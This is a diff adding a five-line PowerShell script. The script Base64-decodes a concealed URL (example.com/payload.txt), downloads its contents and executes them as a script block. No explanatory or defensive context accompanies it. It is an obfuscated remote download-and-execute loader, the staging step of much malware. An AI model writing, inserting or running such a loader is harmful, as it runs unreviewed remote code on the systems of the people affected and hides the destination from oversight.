@@ -1,0 +1,5 @@
+$a = 'aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQudHh0'
+$b = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))
+$c = New-Object Net.WebClient
+$d = $c.DownloadString($b)
+[ScriptBlock]::Create($d).Invoke()
